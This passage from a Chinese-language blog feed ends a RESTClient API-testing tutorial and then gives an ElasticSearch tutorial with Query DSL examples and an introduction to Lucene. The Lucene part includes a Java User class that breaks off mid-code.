alt="API再测试"></p><p>记录的历史API测试完成后，在Windows系统中会使用默认的浏览器打开测试报告。其他系统可以根据提示框中的报告路径，手动打开测试报告。<br>测试报告如图所示：<br><img src="http://blog.wdom.net/upload/2018/12/sq7mku6a0uhvrqk2gecvcvcsgf.png" alt="API测试报告"></p><h2 id="2-5-对历史REST-API生成API文档"><a href="#2-5-对历史REST-API生成API文档" class="headerlink" title="2.5 对历史REST API生成API文档"></a>2.5 对历史REST API生成API文档</h2><p>如果需要生成API文档，在RESTClient菜单栏点击 <code>Apidoc =&gt; Create</code><br><img src="http://blog.wdom.net/upload/2018/12/10qf6lnph6jcpri7tfuvdmhvs3.png" alt="生成API文档"></p><p>API文档生成完成后，在Windows系统中会使用默认的浏览器打开API文档。其他系统可以根据提示框中的文档路径，手动打开API文档。<br>API文档如图所示：<br><img src="http://blog.wdom.net/upload/2018/12/o07em8jbr6g6oqrtahs9f8f2ru.png" alt="API文档"></p><h2 id="2-6-对历史REST-API进行编辑"><a href="#2-6-对历史REST-API进行编辑" class="headerlink" title="2.6 对历史REST API进行编辑"></a>2.6 对历史REST API进行编辑</h2><p>为了满足API再测试要求或者满足API文档数据要求，可以对API进行如下操作：</p><ul><li>调整API顺序</li><li>删除冗余的、废弃的API</li><li>对API进行可视化编辑</li></ul><p>历史视图中选中API，快捷菜单中选择<code>Edit</code>打开API编辑窗体，如图所示：<br><img src="http://blog.wdom.net/upload/2018/12/3318v8o0dqhfrrj6p0ahtrdsvp.png" alt="API可视化编辑窗体"></p><p>在API编辑窗体中，可以编辑如下内容：</p><ul><li>请求方法</li><li>请求URL</li><li>请求头（Header）</li><li>请求体（Body）</li><li>响应状态码（Status）</li><li>响应的消息体（Text视图）</li><li>是否校验返回的消息体（Assert Body）</li></ul><p>默认勾选了<code>Assert Body</code>，API再测试会对返回的消息体进行完整匹配校验，如果不需要对返回的消息体进行匹配校验，可以去勾选。</p><p>如果返回的消息体中的某些JSON节点不需要进行再测试匹配校验，可以在<code>Viewer</code>视图上勾选排除这些节点，这样API再测试只对未排除的节点进行匹配校验。</p><h2 id="2-7-定制API文档"><a href="#2-7-定制API文档" class="headerlink" title="2.7 定制API文档"></a>2.7 定制API文档</h2><p>如果生成的API文档不能满足要求，需要改动，可以修改数据文件<code>work/apidoc/js/apidata.js</code>来定制API文档，API定制详情可以<a href="http://blog.wdom.net/article/10" target="_blank" rel="noopener"><strong>参考资料</strong></a>。</p><h2 id="2-8-通过命令行（CLI）方式使用RESTClient实现自动化测试REST-API"><a href="#2-8-通过命令行（CLI）方式使用RESTClient实现自动化测试REST-API" class="headerlink" title="2.8 通过命令行（CLI）方式使用RESTClient实现自动化测试REST API"></a>2.8 通过命令行（CLI）方式使用RESTClient实现自动化测试REST API</h2><p>RESTClient支持通过执行命令的方式启动和再测试API以及生成API文档，RESTClient CLI使用详情<a href="http://blog.wdom.net/article/6" target="_blank" rel="noopener"><strong>参考资料</strong></a>。</p><p>通过CLI方式，这样很容易在<strong>Jenkins</strong>中定时执行命令来调度RESTClient进行API再测试，从而实现<strong>自动化测试REST API</strong>和生成REST API文档。</p><h1 id="3-问题咨询与帮助"><a href="#3-问题咨询与帮助" class="headerlink" title="3. 问题咨询与帮助"></a>3. 问题咨询与帮助</h1><p>使用RESTClient过程中遇到问题可以查看RESTClient日志文件：<code>work/log/rest-client.log</code>，这样很容易排查出问题的具体原因。</p><p>更多的RESTClient使用示例，请参考<a href="http://blog.wdom.net/tag/RESTClient" target="_blank" rel="noopener"><strong>相关的技术资料</strong></a>来获得更多的使用示例和帮助。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;ES简单测试工具&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="ElasticSearch" scheme="http://yoursite.com/categories/ElasticSearch/"/>
    
      <category term="RESTClient" scheme="http://yoursite.com/categories/ElasticSearch/RESTClient/"/>
    
    
      <category term="ElasticSearch" scheme="http://yoursite.com/tags/ElasticSearch/"/>
    
      <category term="RESTClient" scheme="http://yoursite.com/tags/RESTClient/"/>
    
  </entry>
  
  <entry>
    <title>ElasticSearch</title>
    <link href="http://yoursite.com/2019/06/21/ElasticSearch/"/>
    <id>http://yoursite.com/2019/06/21/ElasticSearch/</id>
    <published>2019-06-21T01:50:00.143Z</published>
    <updated>2019-06-27T05:54:59.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ES这个组件其实挺重要的，早就应该了解的组件，借着这次机会，我尽量把这个组件摸摸透</p></blockquote><a id="more"></a> <h3 id="ES和结构型数据库的横向对比"><a href="#ES和结构型数据库的横向对比" class="headerlink" title="ES和结构型数据库的横向对比"></a>ES和结构型数据库的横向对比</h3><table><thead><tr><th>MySQL</th><th>ElasticSearch</th></tr></thead><tbody><tr><td>Database</td><td>Index</td></tr><tr><td>Table</td><td>Type</td></tr><tr><td>Row</td><td>Document</td></tr><tr><td>Column</td><td>Field</td></tr><tr><td>Schema</td><td>Mapping</td></tr><tr><td>Index</td><td>Everything Indexed by default</td></tr><tr><td>SQL</td><td>Query DSL(查询专用语言)</td></tr></tbody></table><p>这个表格对ES介绍的很好，从概念上很容易就能把ES和MySQL联系到一起。</p><h3 id="ElasticSearch-版本新特性"><a href="#ElasticSearch-版本新特性" class="headerlink" title="ElasticSearch 版本新特性"></a>ElasticSearch 版本新特性</h3><h3 id="ElasticSearch-Java-API"><a href="#ElasticSearch-Java-API" class="headerlink" title="ElasticSearch Java API"></a>ElasticSearch Java API</h3><p>ES的Java REST Client有两种风格：</p><p>Java Low Level REST Client: 用于Elasticsearch的官方低级客户端。它允许通过http与Elasticsearch集群通信。将请求编排和响应反编排留给用户自己处理。它兼容所有的Elasticsearch版本。</p><p>Java High Level REST Client: 用于Elasticsearch的官方高级客户端。它是基于低级客户端的，它提供很多API，并负责请求的编排与响应的反编排。</p><p>在 Elasticsearch 7.0 中不建议使用TransportClient，并且在8.0中会完全删除TransportClient。因此，官方更建议我们用Java High Level REST Client，它执行HTTP请求，而不是序列号的Java请求。</p><h3 id="ElasticSearch-Query-DSL"><a href="#ElasticSearch-Query-DSL" class="headerlink" title="ElasticSearch Query DSL"></a>ElasticSearch Query DSL</h3><h4 id="查询与过滤"><a href="#查询与过滤" class="headerlink" title="查询与过滤"></a>查询与过滤</h4><p>数据检索分为两种情况：<strong>查询</strong>和<strong>过滤</strong></p><p>Query会对检索结果进行<strong>评分</strong>，注重的点是匹配程度，计算的是查询与文档的相关程度，计算完成之后会酸醋一个评分，记录在<code>_score</code>中，最终按照<code>_score</code>进行排序。</p><p>Filter过滤不会对检索结果进行评分，注重的点是是否匹配，，所以速度 要快一点，并且过滤的结果会被缓存到内存中，性能要比Query高很多。</p><h4 id="简单查询"><a href="#简单查询" class="headerlink" title="简单查询"></a>简单查询</h4><p>最简单的DSL查询表达式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /_search //查找整个ES中所有索引的内容</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;:&#123;</span><br><span class="line">    &quot;match_all&quot;: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>/_search</strong> 查找整个ES中所有索引的内容</p><p><strong>query</strong> 为查询关键字，类似的还有<code>aggs</code>为聚合关键字</p><p><strong>match_all</strong> 匹配所有的文档，也可以写<code>match_none</code>不匹配任何文档</p><p>返回结果：</p><p><img src="http://ws4.sinaimg.cn/large/bec9bff2gy1g47rpbap0aj20n30a6gls.jpg" alt="TIM截图20190620175052"></p><p><strong>took：</strong> 表示我们执行整个搜索请求消耗了多少毫秒</p><p><strong>timed_out：</strong> 表示本次查询是否超时</p><p>这里需要注意当<code>timed_out</code>为True时也会返回结果，这个结果是在请求超时时ES已经获取到的数据，所以返回的这个数据可能不完整。</p><p>且当你收到<code>timed_out</code>为True之后，虽然这个连接已经关闭，但在后台这个查询并没有结束，而是会继续执行</p><p><strong>_shards：</strong> 显示查询中参与的分片信息，成功多少分片失败多少分片等</p><p><strong>hits：</strong> 匹配到的文档的信息，其中<code>total</code>表示匹配到的文档总数，<code>max_score</code>为文档中所有<code>_score</code>的最大值</p><p>hits中的<code>hits</code>数组为查询到的文档结果，默认包含查询结果的前十个文档，每个文档都包含文档的<code>_index</code>、<code>_type</code>、<code>_id</code>、<code>_score</code>和<code>_source</code>数据</p><p>结果文档默认情况下是按照相关度（_score）进行降序排列，也就是说最先返回的是相关度最高的文档，文档相关度意思是文档内容与查询条件的匹配程度，上边的查询与过滤中有介绍</p><h4 id="指定索引"><a href="#指定索引" class="headerlink" title="指定索引"></a>指定索引</h4><ol><li><p>指定固定索引：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index1/_search</span><br></pre></td></tr></table></figure></li><li><p>指定多个索引：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index1,index2/_search</span><br></pre></td></tr></table></figure><ol start="3"><li>用*号匹配，在匹配到的所有索引下查找数据</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index-*/_search</span><br></pre></td></tr></table></figure><h3 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h3><p>因为<code>hits</code>默认只展示10个文档，那我们如何查询10个以后的文档呢？ES中给力size和from两个参数。</p><p>size: 设置一次返回的结果数量，也就是<code>hits</code>中文档的数量，默认是10</p><p>from:  设置从第几个结果开始往后查询，默认值是0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;: 5,</span><br><span class="line">  &quot;from&quot;: 10,</span><br><span class="line">  &quot;query&quot;:&#123;</span><br><span class="line">    &quot;match_all&quot;: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这条命令的意义是：显示第11条到15个文档的数据。</p><p><code>match_all</code>为查询所有记录，常用的查询关键字在ES中还有<code>match</code>、<code>multi_match</code>、<code>query_string</code>、<code>term</code>、<code>range</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;:&#123;</span><br><span class="line">    &quot;match&quot;: &#123;</span><br><span class="line">      &quot;host&quot;:&quot;ops-coffee.cn&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;:&#123;</span><br><span class="line">    &quot;multi_match&quot;: &#123;</span><br><span class="line">      &quot;query&quot;:&quot;ops-coffee.cn&quot;,</span><br><span class="line">      &quot;fields&quot;:[&quot;host&quot;,&quot;http_referer&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">//在多个字段上搜索时用multi_match</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;:&#123;</span><br><span class="line">    &quot;query_string&quot;: &#123;</span><br><span class="line">      &quot;query&quot;:&quot;(a.ops-coffee.cn) OR (b.ops-coffee.cn)&quot;,</span><br><span class="line">      &quot;fields&quot;:[&quot;host&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">//可以在查询里边使用AND或者OR来完成复杂的查询</span><br><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;:&#123;</span><br><span class="line">    &quot;query_string&quot;: &#123;</span><br><span class="line">      &quot;query&quot;:&quot;host:a.ops-coffee.cn OR (host:b.ops-coffee.cn AND status:403)&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">//以上表示查询（host为a.ops-coffee.cn）或者是（host为b.ops-coffee.cn且status为403）的所有记录\</span><br><span class="line">与其像类似的还有个simple_query_string的关键字，可以将query_string中的AND或OR用+或|这样的符号替换掉</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//term表示了精确匹配，精确匹配的可以是数字，时间，布尔值或者是设置了not_analyzed不分词的字符串</span><br><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;:&#123;</span><br><span class="line">    &quot;term&quot;: &#123;</span><br><span class="line">      &quot;status&quot;: &#123;</span><br><span class="line">        &quot;value&quot;: 404</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//匹配多个值</span><br><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;terms&quot;: &#123;</span><br><span class="line">      &quot;status&quot;:[403,404]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">//range用来查询落在指定区间里的数字或者时间</span><br><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;range&quot;:&#123;</span><br><span class="line">      &quot;status&quot;:&#123;</span><br><span class="line">        &quot;gte&quot;: 400,</span><br><span class="line">        &quot;lte&quot;: 599</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">//range用来查询落在指定区间内的数字或者时间</span><br><span class="line">范围关键字主要有四个：</span><br><span class="line">gt: 大于</span><br><span class="line">gte: 大于等于</span><br><span class="line">lt: 小于</span><br><span class="line">lte: 小于等于</span><br><span class="line"></span><br><span class="line">并且：当range把日期作为查询范围时，我们需注意下日期的格式，官方支持的日期格式主要有两种</span><br><span class="line">1.时间戳（ms）</span><br><span class="line">get /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;range&quot;: &#123;</span><br><span class="line">      &quot;@timestamp&quot;: &#123;</span><br><span class="line">        &quot;gte&quot;: 1557676800000,</span><br><span class="line">        &quot;lte&quot;: 1557680400000,</span><br><span class="line">        &quot;format&quot;:&quot;epoch_millis&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">2.日期字符串</span><br><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;range&quot;:&#123;</span><br><span class="line">      &quot;@timestamp&quot;:&#123;</span><br><span class="line">        &quot;gte&quot;: &quot;2019-05-13 18:30:00&quot;,</span><br><span class="line">        &quot;lte&quot;: &quot;2019-05-14&quot;,</span><br><span class="line">        &quot;format&quot;: &quot;yyyy-MM-dd HH:mm:ss||yyyy-MM-dd&quot;,</span><br><span class="line">        &quot;time_zone&quot;: &quot;+08:00&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">日期格式可以按照自己的习惯输入，只需要format字段指定匹配的格式，如果格式有多个就用||分开，不过推荐用相同的日期格式。</span><br><span class="line">如果日期中缺少年月日这些内容，那么缺少的部分会用unix的开始时间（即1970年1月1日）填充，当你将&quot;format&quot;:&quot;dd&quot;指定为格式时，那么&quot;gte&quot;:10将被转换成1970-01-10T00:00:00.000Z</span><br><span class="line">elasticsearch中默认使用的是UTC时间，所以我们在使用时要通过time_zone来设置好时区，以免出错</span><br></pre></td></tr></table></figure><h3 id="组合查询"><a href="#组合查询" class="headerlink" title="组合查询"></a>组合查询</h3><p>通常我们可能需要将很多个条件组合在一起查处最后的结果，这个时候就需要使用es提供的<code>bool</code>来实现。</p><p>Ex. 要查询<code>host</code>为<code>ops-coffee.cn</code>且<code>http_x_forworded_for</code>为<code>111.18.78.128</code>且<code>status</code>不为200的所有数据就可以使用下边的语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line"> &quot;query&quot;:&#123;</span><br><span class="line">    &quot;bool&quot;: &#123;</span><br><span class="line">      &quot;filter&quot;: [</span><br><span class="line">        &#123;&quot;match&quot;: &#123;</span><br><span class="line">          &quot;host&quot;: &quot;ops-coffee.cn&quot;</span><br><span class="line">        &#125;&#125;,</span><br><span class="line">        &#123;&quot;match&quot;: &#123;</span><br><span class="line">          &quot;http_x_forwarded_for&quot;: &quot;111.18.78.128&quot;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">      ],</span><br><span class="line">      &quot;must_not&quot;: &#123;</span><br><span class="line">        &quot;match&quot;: &#123;</span><br><span class="line">          &quot;status&quot;: 200</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">组合查询设计四个关键字组合设计查询之间的关系。分别为：</span><br><span class="line">must: 类似于SQL中的AND，必须包含</span><br><span class="line">must_not: 类似于SQL中的NOT，必须不包含</span><br><span class="line">should: 满足这些条件中的任何条件都会增加评分_score，不满足也不影响，should只会影响查询结果的_score值，并不会影响结果的内容</span><br><span class="line">filter: 与must相似，但不会对结果进行相关性评分_score，大多数情况下我们对于日志的需求都无相关性的要求，所以建议查询的过程中多用filter</span><br></pre></td></tr></table></figure><h3 id="全文检索"><a href="#全文检索" class="headerlink" title="全文检索"></a>全文检索</h3><p>全文检索就是对一篇文章进行索引，可以根据关键字搜索，类似于mysql里的like语句。 </p><p>全文索引就是把内容根据词的意义进行分词，然后分别创建索引，例如”你们的激情是因为什么事情来的” 可能会被分词成：“你们“，”激情“，“什么事情“，”来“ 等token，这样当你搜索“你们” 或者 “激情” 都会把这句搜出来。</p><h3 id="ES调优"><a href="#ES调优" class="headerlink" title="ES调优"></a>ES调优</h3><p><a href="https://juejin.im/post/5c3e9813518825552880084a" target="_blank" rel="noopener">调优</a></p><h3 id="Lucene"><a href="#Lucene" class="headerlink" title="Lucene"></a>Lucene</h3><p><strong>介绍</strong>: Lucene是apache软件基金会发布的一个开放源代码的全文检索引擎工具包，由资深全文检索专家Doug Cutting所撰写,它是一个<strong>全文检索引擎的架构</strong>，提供了完整的创建索引和查询索引，以及部分文本分析的引擎。</p><p><strong>特色</strong>: Lucene的目的是为软件开发人员提供一个简单易用的工具包，以方便在目标系统中实现全文检索的功能，或者是以此为基础建立起完整的全文检索引擎，Lucene在全文检索领域是一个经典的祖先，现在很多检索引擎都是在其基础上创建的，思想是相通的。</p><p><strong>Lucene是根据关健字来搜索的文本搜索工具，只能在某个网站内部搜索文本内容，不能跨网站搜索</strong></p><p>为什么有了数据库还要使用Lucene:</p><ul><li>（1）SQL只能针对数据库表搜索，<strong>不能直接针对硬盘上的文本搜索</strong></li><li>（2）<strong>SQL没有相关度排名</strong></li><li>（3）<strong>SQL搜索结果没有关健字高亮显示</strong></li><li>（4）<strong>SQL需要数据库的支持</strong>，数据库本身需要内存开销较大，例如：Oracle</li><li>（5）<strong>SQL搜索有时较慢</strong>，尤其是数据库不在本地时，超慢，例如：Oracle</li></ul><p>以上所说的，我们如果使用SQL的话，是做不到的。因此我们就学习<strong>Lucene来帮我们在站内根据文本关键字来进行搜索数据</strong>！</p><p>我们如果网站需要根据关键字来进行搜索，可以使用SQL，也可以使用Lucene…那么我们<strong>Lucene和SQL是一样的，都是在持久层中编写代码的</strong>。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g4fiswh248j20so0d7gs3.jpg" alt></p><p>Lucene中存的就是<strong>一系列的二进制压缩文件和一些控制文件</strong>，它们位于计算机的硬盘上，<br><strong>这些内容统称为索引库</strong>，索引库有二部份组成：</p><ul><li><p>（1）<strong>原始记录</strong></p></li><li><ul><li>存入到索引库中的原始文本，例如：我是钟福成</li></ul></li><li><p>（2）<strong>词汇表</strong></p></li><li><ul><li>按照一定的拆分策略（即分词器）将原始记录中的每个字符拆开后，存入一个供将来搜索的表</li></ul></li></ul><p>也就是说：<strong>Lucene存放数据的地方我们通常称之为索引库，索引库又分为两部分组成：原始记录和词汇表</strong>….</p><h4 id="原始记录和词汇表"><a href="#原始记录和词汇表" class="headerlink" title="原始记录和词汇表"></a>原始记录和词汇表</h4><p>当我们想要把数据存到索引库的时候，我们首先存入的是将数据存到原始记录上面去….</p><p>又由于我们给用户使用的时候，用户<strong>使用的是关键字来进行查询我们的具体记录</strong>。因此，我们需要把我们<strong>原始存进的数据进行拆分</strong>！将<strong>拆分出来的数据存进词汇表中</strong>。</p><p>词汇表就是类似于我们在学Oracle中的索引表，<strong>拆分的时候会给出对应的索引值。</strong></p><p>一旦用户根据关键字来进行搜索，那<strong>么程序就先去查询词汇表中有没有该关键字，如果有该关键字就定位到原始记录表中，将符合条件的原始记录返回给用户查看</strong>。</p><p>我们查看以下的图方便理解：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g4fiusyxfzj20sy0dcqct.jpg" alt></p><p>到了这里，有人可能就会疑问：难道原始记录拆分的数据都是一个一个汉字进行拆分的吗？？然后在词汇表中不就有很多的关键字了？？？</p><p>其实，我们在存到原始记录表中的时候，可以指定我们使用哪种算法来将数据拆分，存到词汇表中…..我们的<strong>图是Lucene的标准分词算法，一个一个汉字进行拆分</strong>。我们可以使用别的分词算法，两个两个拆分或者其他的算法。</p><h4 id="Lucene程序："><a href="#Lucene程序：" class="headerlink" title="Lucene程序："></a>Lucene程序：</h4><p>首先要导入必要的Lucene的必要开发包</p><ul><li><strong>lucene-core-3.0.2.jar【Lucene核心】</strong></li><li><strong>lucene-analyzers-3.0.2.jar【分词器】</strong></li><li><strong>lucene-highlighter-3.0.2.jar【Lucene会将搜索出来的字，高亮显示，提示用户】</strong></li><li><strong>lucene-memory-3.0.2.jar【索引库优化策略】</strong></li></ul><p>创建User对象，User对象封装了数据….</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by ozc on 2017/7/12.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String id ;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">    <span class="keyword">private</span> String sal;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String id, String userName, String sal)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.userName = userName;</span><br><span class="line">        <span class="keyword">this</span>.sal = sal;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUserName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserName</span><span class="params">(String userName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userName = userName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSal</span><span class="params">(String sal)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sal = sal;</span><br><span class="line">    &#125;</span><br><span 